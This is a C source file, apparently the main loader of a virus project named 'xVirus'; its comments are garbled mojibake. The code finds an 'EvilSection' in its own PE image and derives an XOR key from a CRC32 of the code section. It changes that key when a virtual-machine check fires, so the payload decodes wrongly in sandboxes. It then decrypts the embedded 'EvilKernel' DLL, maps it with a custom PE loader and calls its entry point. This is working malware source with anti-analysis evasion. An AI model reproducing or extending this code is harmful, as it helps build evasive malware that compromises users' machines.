#include "Common.h"
#include <Windows.h>

#include "..\Common\xVirusSupport.c"

/*
 * �ڲ�����ĩβ�ڽṹ
 * X��������DLL
 * Ŀ�����ӳ������Ҫ�Ŀռ�
 */
__integer main(__char *pArgv[], __integer iArgc) {
	__integer iRet = 0;
	/*
	 * ������Ҫ�������DLL���ڴ�
	 */
	PIMAGE_NT_HEADERS pNtHdr = NULL;
	PIMAGE_SECTION_HEADER pEvilSectionHdr = NULL;
	__memory pMem = NULL;
#if defined(__PRINT_DBG_INFO__)
	__dword dwPrintDbgInfoHandle = 0;
#endif

#if defined(__PRINT_DBG_INFO__)
	// ���������ļ���¼
	dwPrintDbgInfoHandle = __PrintDbgInfo_RecordToFileInit__("xVirusLog.txt");
#endif

	__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "Get basic information\r\n");
	pMem = (__memory)GetModuleHandle(NULL);
	pNtHdr = __GetNtHeader__(pMem);
	pEvilSectionHdr = GetEvilSectionHeader(pNtHdr);

	/*
	 * ȡ����������DLL
	 * ��ͨ��PE LOADER������ص��ڴ�
	 * ִ�в���ִ��DLL
	 */
	__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "Get EvilKernel && load it to memory\r\n");
	{
		__integer iEvilKernelSize = 0;
		__memory pEvilKernel = NULL;
		__memory pEvilKernelBuffer = NULL;
		__dword dwKey = 0;//����а����ĵ���Կ

		/*
		 * ����а����ĵĽ���KEY
		 */
		__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "Get EvilKernel decode key\r\n");
		{
			__memory pCode = NULL;
			__integer iCodeSize = 0;
			PIMAGE_SECTION_HEADER pCodeSectionHdr = NULL;
			pCodeSectionHdr = GetCodeSectionHeader(pNtHdr);
			pCode = pMem + pCodeSectionHdr->VirtualAddress;
			iCodeSize = pCodeSectionHdr->Misc.VirtualSize;
			dwKey = crc32(pCode, iCodeSize);

			// ����Ƿ����������,����������½�����KEY
			if (AntiVM0((__address)pMem)) dwKey ^= 0x19831210;
			__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "EvilKernel decode key = ");
			__PrintDbgInfo_RecordIntegerToFile__(dwPrintDbgInfoHandle, dwKey);
			__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "\r\n");
		}
		// ����а�����
		pEvilKernel = pMem + pEvilSectionHdr->VirtualAddress;
		iEvilKernelSize = pEvilSectionHdr->Misc.VirtualSize;
		pEvilKernelBuffer = (__memory)__logic_new_size__(iEvilKernelSize);
		XorArray(dwKey, pEvilKernel, pEvilKernelBuffer, iEvilKernelSize);
		__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "Decode EvilKernel completed\r\n");

		/*
		 * ��а������͵�����ȥ�ĵط�
		 */
		__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "Load EvilKernel to memory\r\n");
		{
			__memory pEvilKernelRuntime = NULL;
			__integer iEvilKernelImageBase = 0;
			PIMAGE_NT_HEADERS pEvilKernelNtHdr = NULL;
			pEvilKernelNtHdr = __GetNtHeader__(pEvilKernelBuffer);
			iEvilKernelImageBase = pEvilKernelNtHdr->OptionalHeader.SizeOfImage;
			pEvilKernelRuntime = (__memory)__logic_new_size__(iEvilKernelImageBase);
			/*
			 * ׼��PE LOADER
			 */
			{
				FPEvilKernelEntry pEvilKernelEntry = NULL;

				__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "Already LoaderEvilKernel(pEvilKernelBuffer, pEvilKernelRuntime, iEvilKernelImageBase)\r\n");
				pEvilKernelEntry = LoaderEvilKernel(pEvilKernelBuffer, pEvilKernelRuntime, iEvilKernelImageBase);
				if (!pEvilKernelEntry)
					return 0xFFFFEEEE;//��㷵��һ��ֵ
				// ִ��а�����
				__logic_delete__(pEvilKernelBuffer);//�Ƿ���ʱ�ڴ�
				__PrintDbgInfo_RecordStringToFile__(dwPrintDbgInfoHandle, "Invoke EvilKernel dllmain\r\n");
				__PrintDbgInfo_RecordToFileClose__(dwPrintDbgInfoHandle);
				// �Կ������
				AntiVM1();
				pEvilKernelEntry((__dword)pEvilKernelRuntime, DLL_PROCESS_ATTACH, NULL);
			}
		}
	}

	/*
	 * ����Ĵ��붼���ᱻִ��,���ǳ���
	 */

	return iRet;
}
